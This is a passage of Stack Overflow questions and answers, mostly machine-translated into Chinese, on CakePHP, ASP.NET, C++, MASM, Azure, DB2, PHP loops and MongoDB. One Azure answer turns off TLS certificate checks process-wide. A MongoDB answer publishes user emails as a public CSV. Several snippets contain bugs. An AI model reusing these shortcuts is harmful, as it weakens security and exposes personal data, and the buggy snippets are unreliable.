我认为本专栏造成了一些冲突，因此，UPDATE 不起作用。在尝试此操作之前，我将表名更改为`users`保持列不变`administrators`并且也可以正常工作。

如果问题不是表名和同名表列冲突，那我改名后问题解决了，真是太巧了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:23:52.283

试试这个：

```
$this->request->data['Administrator']['id'] = $id; // <-- Line changed
$this->Administrator->save($this->request->data); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:05:00.433

您是从表单构建此提交吗？您在视图上的表单中有什么？我的第一个猜测是你忽略了包含隐藏的 id 输入，它告诉 CakePHP 我们正在更新什么模型对象：

```
echo $this->Form->input('id',array('type' => 'hidden')); 
```

如果你调用这些函数，你会收到什么样的数据？

```
debug($this->request->data);
debug($this->Administrator); 
```

如果它不是表单本身的问题，我会怀疑只是因为它们 ID=1 应该只来自一些残留数据或未设置的模型。

# asp.net - ASP.NET 和异步事件处理

> ID：13703897
> 
> 赞同：1
> 
> 时间：2012-12-04T13:20:11.323
> 
> 标签：asp.net, asynchronous

我正在运行 ASP.NET 4.0 WEBFORMS

这个问题困扰着我......我已经阅读了 SO 以及 MSDN 上的几个线程，但我认为我错过了这个异步拼图的最后一块......

我想要完成的是异步更新标签，作为测试我设置了一个按钮和一个标签。然后我有一个循环，每次循环达到等于或大于 7 的数字时从 0 到 9 计数，我希望它用数字更新标签。

我已经让它同步工作，但是标签最终将只显示最后一个数字。我已经设置了所有方法并连接了事件，但即使我使用 beginInvoke 和 asyncresult，它也不会更新。

目前它根本没有更新，大量的测试让我回到了原点？我设法让它更新，我什至尝试使用 system.threading.thread.sleep(3000)，看看它是否更新得很快，但这根本不起作用？

我很困惑有人对如何实现这一点有提示吗？

这是我的代码

首先我的柜台课

```
public class counter
{
public static event numberHandler FoundNumber;
public delegate void numberHandler(string position);

public void theAscendator()
{
    for (int i = 0; i < 10; i++)
    {
        if (i >= 7)
        {
            string labelText = i.ToString();

            if(FoundNumber != null)
            {
                FoundNumber.BeginInvoke(labelText, new AsyncCallback(this.SevenAndOver),null);                 
            }
        }
    }
}

public void SevenAndOver(IAsyncResult ar)
{
    FoundNumber.EndInvoke(ar);

} 

} 
```

**现在我的主页（index.aspx）代码隐藏**

```
public partial class index : System.Web.UI.Page
{
protected void Page_Load(object sender, EventArgs e)
{
}
private void index_FoundNumber(string position)
{

 //   Response.Write(position);

    Label1.Text = position;

    //   throw new NotImplementedException();
}
protected void Button1_Click(object sender, EventArgs e)
{
    counter counterClass = new counter();
    counterClass.theAscendator();        
    counter.FoundNumber += new counter.numberHandler(index_FoundNumber);
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:38:55.707

我的猜测是您是 Web 新手，并且您可能是桌面专家（wpf/winforms）。对于像您这样从单层应用程序过渡的人来说，这种问题很常见。您必须记住，尽管 webforms 模型*看起来*像 winforms，但它根本不是那种类型。它是无状态请求/响应客户端/服务器模型（即 HTTP）上的一层薄纱。

这不起作用的原因仅仅是因为当异步计数器类完成时，页面请求已经完成。您无法修改 html，因为它已经被发送回浏览器。一旦点击处理程序完成，页面就“完成”了。asp.net 中的服务器端异步代码本质上是“无头”运行的。最好用来做一些不再需要客户端的工作。

那么，你会怎么做呢？嗯，一开始并不明显，但异步 Web 工作通常由*客户端*驱动，而不是服务器。客户端是浏览器，技术是 AJAX - 异步 JavaScript 和 XML。这个想法是在服务器上处理事件，返回页面，然后客户端上的 javascript 将轮询服务器以获取新数据，而不会对页面进行完整的回发。

既然我已经说了这么多，实际上有一种方法可以模拟双向异步，但是如果不了解基本原理，您可能会觉得很难。如果您有兴趣，该技术称为 SignalR (http://signalr.net/)。这允许服务器 (asp.net C#) 调用客户端 (javascript) 上的方法，反之亦然。

因此，我的建议是首先从基础层面了解 HTTP 模型，然后开始研究 ASP.NET 等抽象。

# jquery - ASP.Net MVC 4 和 JavaScript 框架 - AJAX 和不显眼的验证

> ID：13703900
> 
> 赞同：3
> 
> 时间：2012-12-04T13:20:20.357
> 
> 标签：jquery, backbone.js, asp.net-mvc-4, knockout.js, single-page-application

在 asp.net MVC（不是 WebAPI）中，我们可以使用 **AJAX**和 jQuery 向控制器发出异步请求。我已经制作了一堆函数来在需要的地方调用控制器。对于 Validation，我们可以利用**Model 的 DataAnnotation 验证，**使用**不显眼的验证**。

但是看到最近的 javascript 框架，如骨干网、淘汰赛和许多其他框架，

有没有将这些框架用于 asp.net MVC 应用程序的最佳方法。

[我在这里](http://www.johnpapa.net/spa)启发了使用 Javascript 架构，这是对**ASP.NET MVC SPA**的精彩介绍。

我还阅读了很多关于**骨干**使用和**淘汰**可观察（MVVM）的博客，但无法找到将它们结合在一起的方法。优点是易于维护 javascript。

我看过**Todomvc**应用程序（选择 MV*），并且可以看到模型的最佳使用，但不是验证和 ajax。

最后，在 ASP.NET MVC4 应用程序（不是 WebAPI）中使用现有**JavaScript 框架进行****AJAX、不显眼验证**的最佳方式是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-01-12T13:24:45.023

查看这篇 Microsoft 文章[ASP.Net Single Package Application](http://www.asp.net/single-page-application "ASP.Net 单包应用程序")并根据您的需要做出选择。

我认为 Breeze/Knockout 模板是简单和中小型应用程序的最佳选择 - 它是 ASP.Net MVC 集成最快和最简单的方法。

但是对于大型（范围）应用程序，Breeze/Angular 或 DurandalJS 模板会是更好的选择。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T20:51:52.970

对于 KnockoutJS，存在[KnockoutMVC](http://knockoutmvc.com/Home/Introduction)库。它有助于构建视图模型和许多其他事情。

# c++ - 如何打印包含集合的地图的内容？

> ID：13703904
> 
> 赞同：3
> 
> 时间：2012-12-04T13:20:41.227
> 
> 标签：c++, dictionary, set, output, stdmap

我有一张声明如下的地图：

```
map < string, set<string> > index;
std::map < string, set<string> >::iterator iter; 
```

我想打印`index`. 因此，我写了以下内容：

```
for (iter = index.begin(); iter!= index.end(); iter++){
    cout << iter->first << endl;}  // It's OK. 
```

但是如果我尝试打印，上面的代码将不起作用`iter->second`：

```
for (iter = index.begin(); iter!= index.end(); iter++){
    cout << iter-> second << endl;}  // Doesn't work. 
```

我想这是因为`second`in`index`是一组字符串而不是简单的字符串。但是我怎样才能打印呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:27:26.677

如果你想打印

```
iter->second 
```

使用操作符<<，你必须重写这个操作符！否则，使用集合迭代器迭代由 iter->second 表示的字符串集合：

```
set<string>::iterator iterator_; 
```

# 更新[迭代器]

迭代很容易，忍者解决方案是重载运算符！:P

迭代：

```
map<string, set<string> >::iterator iter_;
for (iter_ = index_.begin(); iter_ != index_.end(); iter_++) {
cout << iter_->first << " - ";
    set<string>::iterator iterator_;
for (iterator_ = s.begin(); iterator_ != s.end(); iterator_++) {
    cout << *iterator_ << " - ";
}   
    cout << endl;
} 
```

# 更新 [重载 ostream& 运算符<<]

```
class MySet: public set<string> {
friend ostream& operator<<(ostream& out, const MySet& s) {
    set<string>::iterator iterator_;
    for (iterator_ = s.begin(); iterator_ != s.end(); iterator_++) {
        out << *iterator_;
    }
    return out;
}

void test() {
    map<string, MySet> index_;
    map<string, MySet>::iterator iter_;
    for (iter_ = index_.begin(); iter_ != index_.end(); iter_++) {
        cout << iter_->first << " - ";
        cout << iter_->second;  
    }
}
}; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T16:26:50.093

在过去的几年中，我使用了以下功能。如果重载运算符<<，则必须小心，因为最终编译器可能会给您错误，因为它无法在标准运算符<< 和自定义运算符<< 之间进行选择。

随着 C++11 引入 lambda 和基于范围的 for 循环，我可能不需要它的频率。

```
#include <vector>
#include <iostream>
#include <algorithm>
#include <iterator>

using namespace std;

template<typename C>
void print_container(ostream& os, const C& c)
{
  copy(c.begin(), c.end(), ostream_iterator<int>(os, " "));
}

int main(void)
{
  vector<int> v; 
  v.push_back(1); 
  v.push_back(2);
  v.push_back(3);

  print_container(v);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:44:27.803

（在我看来）C++ 中最烦人的事情是没有为标准库类型定义输出运算符。

你需要一些代码有点像：

```
typedef std::map < string, set<string> >::iterator iter;

for (iter = index.begin(); iter!= index.end(); iter++) {
  std::cout << iter->first << " : {";
  for(set<string>::iterator it = iter->second.begin(); it != iter->second.end(); ++it) {
    std::cout << *it << " ";
  }
  std::cout << "}\n";
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-03-26T12:34:31.683

正如您所说，`iter->second`代表代码中的一组字符串。您不能简单地打印它，因为默认情况下`operator<<`输出流不知道如何格式化`std::set`。正如*Luca Davanzo 的* [回答](https://stackoverflow.com/a/13704024/2675154)中所解释的，一种解决方案是为您的集合重载该运算符。

*如Chris Jefferson 的* [回答](https://stackoverflow.com/a/13704346/2675154)所示，另一个解决方案是简单地添加另一个循环来迭代您的集合。但是，可以通过使用以下[C++11](https://en.wikipedia.org/wiki/C%2B%2B11)功能来提高该解决方案的可读性：[基于范围的 for 循环](https://en.cppreference.com/w/cpp/language/range-for)和占位符[auto](https://en.cppreference.com/w/cpp/language/auto)。因此，您的代码可能如下所示：

```
std::map<std::string, std::set<std::string>> index;
index["a"] = { "v", "w" };
index["b"] = { "x", "y", "z" };

for (const auto &mapItem : index) {
    std::cout << "m[" << mapItem.first << "] =";
    for (const auto &setItem : mapItem.second)
        std::cout << " " << setItem;
    std::cout << std::endl;
} 
```

输出：

> m[a] = vw
> m[b] = xyz

从[C++17 开始](https://en.wikipedia.org/wiki/C%2B%2B17)，您可以将基于范围的 for 循环与[结构化绑定](https://en.cppreference.com/w/cpp/language/structured_binding)一起使用。这进一步提高了可读性，因为您可以从代码中删除`first`and`second`成员：

```
for (const auto &[k, v] : index) {
    std::cout << "m[" << k << "] =";
    for (const auto &s : v)
        std::cout << " " << s;
    std::cout << std::endl;
} 
```

[Coliru 上的代码](http://coliru.stacked-crooked.com/a/05e92a44060f567d)

# assembly - 使用 Masm 的浮点数据示例

> ID：13703907
> 
> 赞同：2
> 
> 时间：2012-12-04T13:20:53.457
> 
> 标签：assembly, floating-point, masm32

有人可以给我一个例子，如何在 MASM 的数据部分定义浮点数或常量吗？或者至少有一些关于它的信息......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T14:23:38.607

我想它已经完成了

```
.data
   myVar REAL4  1.0f

.code 
```

Masm 中的浮点值是 REAL4、REAL8 或 REAL10。
表达式（例如#define myConst 1.0f）用 `myConst EQU 1.0`

这些并不特定于任何部分。

# c# - AutoStart a WCF on Azure WebRole

> ID：13703908
> 
> 赞同：8
> 
> 时间：2012-12-04T13:20:54.720
> 
> 标签：c#, wcf, azure, iis-7.5

I have a WCF hosted on Azure (WebRole). That WCF does a lot of background tasks and replies to some petitions.

The problem is that if the WCF doesn't receive any petition for a long time (10 hours or more) the application pool is recycled on the azure instance and the WCF tasks stops. I did a little investigation an I can enable a AutoStart feature touching the machine.config, but this is not an option with a azure deploy.

Can I enable AutoStart within web.config or deploy config files?

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-04T13:30:22.803

You can add some code in the WebRole.cs to modify the application pool:

```
public class WebRole : RoleEntryPoint
{
    public override void Run()
    {
        using (var serverManager = new ServerManager())
        {
            var mainSite = serverManager.Sites[RoleEnvironment.CurrentRoleInstance.Id + "_Web"];
            var mainApplication = mainSite.Applications["/"];
            var mainApplicationPool = serverManager.ApplicationPools[mainApplication.ApplicationPoolName];
            mainApplicationPool["autoStart"] = true;
            mainApplicationPool["startMode"] = "AlwaysRunning";

            serverManager.CommitChanges();
        }

        base.Run();
    }

    public override bool OnStart()
    {
        // For information on handling configuration changes
        // see the MSDN topic at http://go.microsoft.com/fwlink/?LinkId=166357.

        return base.OnStart();
    }
} 
```

**Note:** To use `ServerManager` you will need to:

*   reference **C:\Windows\system32\inetsrv\Microsoft.Web.Administration.dll** (or available through NuGet)
*   add `<Runtime executionContext="elevated" />` in your Service Definition under the WebRole element

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-03-16T17:25:48.833

While Sandrino's solution might work... here is a solution that does not require the web role to run in elevated security mode, and also will force the application to start when the webrole starts (before the first user visits the site). This solution will also work on older versions of IIS/Windows Server that does not require IIS 8's "Application Initialization" feature.

Just add a WebRole.cs with the following content:

```
using System;
using System.Net;
using System.Net.Security;
using System.Threading;
using Microsoft.WindowsAzure.ServiceRuntime;

namespace Website
{
    public class WebRole : RoleEntryPoint
    {
        public override bool OnStart()
        {
            WarmUpWebsite("HttpIn");
            return base.OnStart();
        }

        public override void Run()
        {
            while (true)
            {
                WarmUpWebsite("HttpIn");
                Thread.Sleep(TimeSpan.FromMinutes(1));
            }
        }

        public void WarmUpWebsite(string endpointName)
        {
            // Disable check for valid certificate. On som sites live HTTP request are redirected to HTTPS endpoint. And when running on staging SSL the certificate is invalid.
            RemoteCertificateValidationCallback allowAllCertificatesCallback = (sender, certificate, chain, sslPolicyErrors) => true;
            ServicePointManager.ServerCertificateValidationCallback += allowAllCertificatesCallback;
            try
            {
                RoleInstanceEndpoint endpoint = RoleEnvironment.CurrentRoleInstance.InstanceEndpoints[endpointName];

                string address = String.Format("{0}://{1}:{2}", endpoint.Protocol, endpoint.IPEndpoint.Address, endpoint.IPEndpoint.Port);

                //This will cause Application_Start in global.asax to run
                new WebClient().DownloadString(address);
            }
            catch (Exception)
            {
                // intentionally swallow all exceptions here.
            }
            ServicePointManager.ServerCertificateValidationCallback -= allowAllCertificatesCallback;
        }
    }
} 
```

Credits goes to: [http://weblogs.thinktecture.com/cweyer/2011/01/poor-mans-approach-to-application-pool-warm-up-for-iis-in-a-windows-azure-web-role.html](http://weblogs.thinktecture.com/cweyer/2011/01/poor-mans-approach-to-application-pool-warm-up-for-iis-in-a-windows-azure-web-role.html)

The while(true) could be replaced with Sandrino's approach or you could disable application pool idle timeout: [http://blog.smarx.com/posts/controlling-application-pool-idle-timeouts-in-windows-azure](http://blog.smarx.com/posts/controlling-application-pool-idle-timeouts-in-windows-azure)

# javascript - 点击更改背景图片

> ID：13703909
> 
> 赞同：0
> 
> 时间：2012-12-04T13:20:59.477
> 
> 标签：javascript

我有一个 ID 为“艺术”的 div。这个 div 应该有背景“S1_img1.jpg”。在 div 下方有一个按钮，当我单击它时，背景图像必须更改为“S1_img2.jpg”。

当我再次单击它时，它必须更改为“S1_img3.jpg”，然后继续。但是，img4 是最后一个。这意味着当 div 背景当前设置为 img4 并且我再次单击该按钮时，它必须变回 img1。

我试图通过使用 javascript 来实现这一点，但我无法让它工作。

1）当我使用下面的代码时，即使我确定图像路径正确，图像也不会显示为背景。

```
<script type="text/javascript">
document.getElementById("art").style.backgroundImage = "url(content/art/S1/S1_img1.jpg)";</script> 
```

2）我怎样才能让它在我点击按钮时改变背景，就像我描述的那样？

此时按钮的 onClick 执行 javascript 函数“count();”。

```
<script type="text/javascript">
var img = 1;

function count() {
    img = img + 1;
    document.getElementById("content").style.backgroundImage = "url(content/art/S3/S3_img1.jpg)";
}
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:25:12.363

您可以为此使用条件

```
<script type="text/javascript">
var img = 1;

function count() {
img = img + 1;
document.getElementById("content").style.backgroundImage = "url(content/art/S3/S3_img"+img+".jpg)";
if (img==4) img=0;
}
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-02T20:43:12.247

如果您使用 HTML5，则可以使用自定义属性（请参阅[此答案](https://stackoverflow.com/a/432201/4375327)）。它比使用全局变量更好，这样你可以管理多个元素的背景。

```
<div style="background-image:url(content/art/S1/S1_img1.jpg);cursor:pointer"
     onclick="toggleBackgroundImage(this)">a</div>

<script type="text/javascript">
function toggleBackgroundImage(element) {
    var idbgrank = parseInt(element.getAttribute("data-idbgrank"));
    idbgrank = idbgrank ? idbgrank + 1 : 2;
    element.setAttribute("data-idbgrank", idbgrank)
    if (idbgrank > 4) return;
    element.style.backgroundImage = "url(content/art/S1/S1_img" + idbgrank + ".jpg)";
    alert(element.style.backgroundImage); //remove it ;)
}
</script> 
```

见小提琴：http: [//jsfiddle.net/g40hL0jc/3/](http://jsfiddle.net/g40hL0jc/3/)

（结果通过 alert() 调用可见，您只需将其删除）。

# .net - IL中堆栈项的重复顶部没有帮助变量

> ID：13703910
> 
> 赞同：1
> 
> 时间：2012-12-04T13:21:00.300
> 
> 标签：.net, stack, cil, il

是否可以复制顶部堆栈项目并将其推回？我只知道使用这样的辅助局部变量的解决方案：

```
stloc.n
ldloc.n
ldloc.n 
```

是否存在用于复制堆栈项的 IL 指令？是否可以避免使用辅助局部变量？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T13:26:14.740

你看了[`OpCodes.Dup`](http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes.dup.aspx)吗，它复制了顶部的堆栈项？

# db2 - 如何在 DB2 中创建表空间？

> ID：13703916
> 
> 赞同：1
> 
> 时间：2012-12-04T13:21:21.087
> 
> 标签：db2, tablespace

我想在 DB2 中创建表空间，我的平台是 AIX。

我想在我的操作系统的目录中拥有该表空间。我还创建了一个具有相同页面大小的表空间的缓冲池。但是得到 SQLCODE=-104。

```
CREATE BUFFERPOOL BPOOL  SIZE 2000 PAGESIZE 16K;

CREATE TABLESPACE TS01 

MANAGED BY DATABASE 
USING ( '/dbdata/UMPSYS01' )  
PAGESIZE 16K
BUFFERPOOL BPOOL 
```

我也尝试过使用`DEVICE`和`FILE`令牌给出尺寸。但无法运行它。

我得到以下错误：

```
18:13:38  [CREATE - 0 row(s), 0.000 secs]  [Error Code: -104, SQL State: 42601]  DB2 SQL Error: SQLCODE=-104, SQLSTATE=42601, SQLERRMC=USING ( '/dbdata/UMPSYS01' );ESPACE TS01 
;<space>, DRIVER=3.61.75 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T17:38:21.300

获得正确的语法非常重要（不幸的是），键的顺序正确。该`CREATE TABLESPACE`语句的语法图可[在此处](http://pic.dhe.ibm.com/infocenter/db2luw/v9r7/topic/com.ibm.db2.luw.sql.ref.doc/doc/r0000929.html)获得。

您已将`PAGESIZE`子句*放在*`MANAGED BY ...`不正确的后面。应该是之前：

```
CREATE TABLESPACE TS01 
    PAGESIZE 16K
    MANAGED BY DATABASE 
    USING (FILE '/dbdata/UMPSYS01.dms' 100M)  
    BUFFERPOOL BPOOL 
```

# android - 为什么我的动画没有停在正确的位置？

> ID：13703921
> 
> 赞同：1
> 
> 时间：2012-12-04T13:21:38.053
> 
> 标签：android, animation, slide, ontouchlistener

在可能的应用程序中，我有两个动画。一个是从屏幕底部到顶部增长。它在我的 startNewAnimation() 方法中调用：

```
mSurfaceGrowingAnimation = new TranslateAnimation(0, 0, mViewHeight, 0);
mSurfaceGrowingAnimation.setInterpolator(new LinearInterpolator()); 
```

这个方法在这个内部被调用：

```
ViewTreeObserver observer = ViewTimer.getViewTreeObserver();
observer.addOnGlobalLayoutListener(new OnGlobalLayoutListener() {
    @Override
    @SuppressWarnings("deprecation")
public void onGlobalLayout() {
    Log.d(TAG, "onGlobalLayout");
        mViewHeight = ViewTimer.getHeight();
        startNewAnimation();
        ViewTimer.getViewTreeObserver().removeGlobalOnLayoutListener(this);
    }
}); 
```

我的其他动画就像一个滑动按钮。它用于停止动画。

```
@Override
public boolean onTouch(View view, MotionEvent event) {
AbsoluteLayout.LayoutParams layoutParams = (AbsoluteLayout.LayoutParams) view.getLayoutParams();

switch (event.getAction() & MotionEvent.ACTION_MASK) {

    case MotionEvent.ACTION_UP:
        showDialog();
        pauseAnimation();
        int endOfAnimation = findViewById(R.id.slide_included).getWidth() - mSlideView.getWidth();
        mSlideAnimation = new TranslateAnimation(event.getX(), endOfAnimation - layoutParams.x, 0, 0);
        mSlideAnimation.setDuration(1000);          
        mSlideAnimation.setFillAfter(true);
        mSlideView.startAnimation(mSlideAnimation);

        break;

    case MotionEvent.ACTION_MOVE:
        layoutParams.x = (int) event.getRawX();
        view.setLayoutParams(layoutParams);

        break;
    } 
```

也就是说，当我移动幻灯片视图时，我调用了 pauseAnimation() 方法来清除主动画。

问题是：当我的主动画停止时，如果它在幻灯片按钮下方，那么它会被绘制到幻灯片视图的顶部。我怎样才能解决这个问题？

这是我的布局：

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/frame_main"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <RelativeLayout
        android:id="@+id/time_view"
        android:layout_width="match_parent"
        android:layout_height="match_parent" >

        <View
            android:id="@+id/surface_view_timer"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_alignParentBottom="true"
            android:layout_marginBottom="0dp"
            android:background="#77B21B00" /> 
    </RelativeLayout>

<include
    android:id="@+id/slide_included"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_gravity="center_horizontal|bottom"
    android:layout_margin="20dp"
    layout="@layout/slide" />

</FrameLayout> 
```

幻灯片.xml

```
<?xml version="1.0" encoding="utf-8"?>
<AbsoluteLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/slide_layout"
    android:layout_width="match_parent"
    android:layout_height="50dp"
    android:layout_alignParentBottom="true"
    android:layout_margin="20dp"
    android:background="#0000FF" >

    <View
        android:id="@+id/slide_to_pause"
        android:layout_width="50dp"
        android:layout_height="50dp"
        android:background="#00FFFF" />
</AbsoluteLayout> 
```

# sql - 协助 SQL 查询

> ID：13703928
> 
> 赞同：0
> 
> 时间：2012-12-04T13:22:05.563
> 
> 标签：sql, ms-access

现在我有两个单独的查询来获得结果，但我想要一个查询。我正在使用 MS Access。

```
tblJournal          tblArticle      tblStatus
----------          ----------      ---------
JournalID           ArticleID       ID
JournalTitle        JournalCode     StatusName
JournalCode         StatusID       
Cancelled(yes/no)   Date
                    ArticleTitle
                    SignedDate 
```

查询应该有：

```
tblJournal.JournalTitle, 
tblJournal.JournalCode, 
Year([tblArticle].[Date]), 
Count of articles per year which have a tblArticle.SignedDate, 
Count of articles per year with tblStatus.StatusName 'Published' and tblJournal.Cancelled NO. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:45:01.477

我认为这应该是您正在寻找的：

```
SELECT
  tblJournal.JournalTitle, 
  tblJournal.JournalCode, 
  Year([tblArticle].[Date]),
  Count(tblArticle.SignedDate) as Tot_Articles_Year,
  Sum(IIF((not tblJournal.Cancelled) and (tblStatus.StatusName='Published'),1,0)) as Tot_Published
FROM
  (tblJournal LEFT JOIN tblArticle
   ON tblJournal.JournalCode = tblArticle.JournalCode)
  LEFT JOIN tblStatus
  ON tblArticle.StatusID = tblStatus.ID
GROUP BY 
  tblJournal.JournalTitle, 
  tblJournal.JournalCode, 
  Year([tblArticle].[Date]) 
```

# .net - 是否有任何不符合 CLS 的常用 .NET 语言？

> ID：13703935
> 
> 赞同：3
> 
> 时间：2012-12-04T13:22:20.267
> 
> 标签：.net, cls-compliant

这些天是否有任何不符合 CLS 的 .NET 语言常用？看起来 VS2012 开箱即用的每一种托管语言都支持无符号整数类型，所以实际上来说，在公共/受保护类型签名中使用“无符号”可能会遇到多大麻烦？

看起来 CLR、CTS 和相关技术在这一点上基本上已经“完成”了，所以人们想知道 CLS 合规性对于“现代”.NET 代码有多少好处。

我们现在是否纯粹出于动力而跳过 CLS 篮球？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T14:24:51.760

CLS 合规性是**代码**的属性，而不是语言的属性。有一个早期版本的 VB.NET，您不能在其中意外编写不兼容的代码。这并没有持续多久，它在 2005 年左右的某个地方获得了对无符号整数类型的支持。

它仍然是相关的，您仍然可以编写一个库，该库可能用于移植到 .NET 并且不支持无符号整数或不区分大小写等的语言中。该方法很简单，您只需避免在代码中使用不兼容的功能，您的程序集应该可以正常工作。这很容易做到，将这行代码添加到任何地方：

```
 [assembly:CLSCompliant(true)] 
```

当你违反规则时，编译器会给你一个警告。

# php - For 循环将时间增加 45 分钟

> ID：13703936
> 
> 赞同：4
> 
> 时间：2012-12-04T13:22:21.440
> 
> 标签：php, for-loop

我知道我可以像这样用整个整数做一个正常的循环

```
for($i=0;$i<10;$i++)
{
   echo $i;
} 
```

**问题：**
我想循环一个不是整数而是~~浮点~~时间（45分钟）的循环。我希望结果是这样的：

```
0.45
1.30
2.15
3.00
3.45
... 
```

PHP中是否有任何帮助函数来实现这一点？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-04T13:58:24.183

阅读评论并看到您实际上想要使用时间，您甚至可以`DateTime`在 for 循环中使用对象

这是一些示例代码：

```
for (
    $d = new DateTime('00:00'), // Initialise DateTime object .
    $i = new DateInterval('PT45M'); // New 45 minute date interval
    $d->format('H') < 10; // While hours (24h) less than 10
    $d->add($i) // Add the interval to the DateTime object
)
{
    echo $d->format("H:i\n");
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T13:24:54.667

您可以简单地在循环中使用浮点数。`$i++`在循环的最后部分意味着将计数器增加`1`. 只需将其更改为即可`0.45`。

```
for($i=0;$i<10;$i=$i + 0.45)
{
   echo $i;
} 
```

// 编辑

正如许多人指出的那样，浮点精度存在固有问题。上面的例子*应该*适用于小数字 `$i < 100`，但当数字变大时可能会出现问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T13:24:29.937

```
for($i=0;$i<10;$i += 0.45)
{
   echo $i;
} 
```

像这样的东西？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:27:55.753

你可以简单地使用

```
for($i=0.0;$i<10.0;$i=$i+0.45)
{
   echo $i;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T13:28:14.727

我不确定我是否会使用浮点值来控制循环本身，特别是考虑到它们不精确的倾向:-)

由于您似乎有一个公式，您可以简单地在循环中使用公式：

```
for ($i = 0; $ < 10; $i++) {
   $num = 0.45 + $i * 0.85;
   echo $num;
} 
```

这允许使用整数控制循环，并简单地为您提供基于该整数的浮点值。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-04T13:26:23.620

我不会依赖浮点数。原因是四舍五入。

你通常做的是使用一个int，然后除。

```
for($i=0, $j=0; $i < $MAX; $i += 45, $j = $i / 100)
{
    echo $j;
} 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-12-04T13:26:15.240

也许是这样的：

```
for ($i=1; $i<=10; $i++) {
    echo $i * 0.45."<br />";
} 
```

# orm - 学说2 symfony2.1实体$ showMapper中的所有字段？

> ID：13703948
> 
> 赞同：0
> 
> 时间：2012-12-04T13:23:00.797
> 
> 标签：orm, doctrine-orm, entity, symfony-2.1

我不知道这是否可能或如何做到这一点

表 A id 名称 feature_id ...

表 B id_feature 标签 url 描述 ...

我有 2 个实体，我做了一个 @ORM\ManyToOne(targetEntity="tableB")

在我的 $showmapper 中，我得到了带有标签的结果，但没有带有 url，描述

为什么 ？

如何在我的实体中做到这一点？

谢谢再见

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T15:38:10.423

解决...

我喜欢这个

```
->add('parent1', 'entity', array('label' => 'region', 'property_path' => 'appellation.parent.parent', 'class' => 'Application\Ghv\AdministrationBundle\Entity\Regions')) 
```

我可以像这样访问我的子属性

# mongodb - 如何将网站数据库切换到用户访问者的本地计算机

> ID：13703949
> 
> 赞同：0
> 
> 时间：2012-12-04T13:23:00.120
> 
> 标签：mongodb, couchdb

我总是问自己如何建立网站，用户可以在其中下载数据库并相互共享。像种子或类似的东西。

因此，用户来到网站，他可以从我们的服务器或彼此下载所有数据库和网站并使其离线，即使我们的服务器关闭，他们也可以再次更新，然后他们可以相互共享。所以在他们的手机桌面上。

我认为 Skype 做了类似这两个聊天的用户，他们都有该聊天日志的副本，所以如果一个人松了它，另一个人仍然拥有它并且可以同步。

因此，如果有人可以给我一些想法，或者可能有类似的东西可以使编程更容易......比如共享数据库（mysql、couchdb、mongodb 等），然后我可以对其进行编程以使数据库脱机在他们的电脑上。

以及维基解密是如何做到的，他们的信息无处不在

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T23:21:44.813

我会设置一个 cron 来将相关的 MongoDB 集合作为 CSV 或 JSON 文件转储到外部用户可以访问的文件中。例如，这是一个每 15 分钟运行一次并在“mydatabase”中导出“users”集合的 cron：

```
*/15 * * * * mongoexport --csv -h localhost:27017 -d mydatabase -c users -f name,email,age -o /path/to/public/users.csv 
```

因此，用户可以下载“users.csv”。当然，您不会为敏感信息这样做，对吧？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-05T00:16:36.203

离线模式对于网站来说是一项很棒的功能，但“共享”数据库通常不是最好的方式，因为您永远不知道哪个数据副本将是最新的，谁进行了可能发生冲突的更改等.

一种选择是仍然使用集中式数据库，并将用户对自己的数据所做的更改排队，以便在服务器上重放。这不是万无一失的，因为仍然可能存在数据冲突，并且用户可以轻松地滚动更改。您需要检查是否有更新的版本、最后修改项目的人员等。

# oop - 面向对象的逻辑

> ID：13703956
> 
> 赞同：0
> 
> 时间：2012-12-04T13:23:24.093
> 
> 标签：oop, design-patterns, uml, logic

是否有设计模式或好的方法可以帮助我对逻辑条件进行建模，例如 ((a > b OR c == d) AND e < f)。特别是，我对如何使用对象编程以灵活的方式定义括号和 OR/AND 感兴趣。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:55:19.530

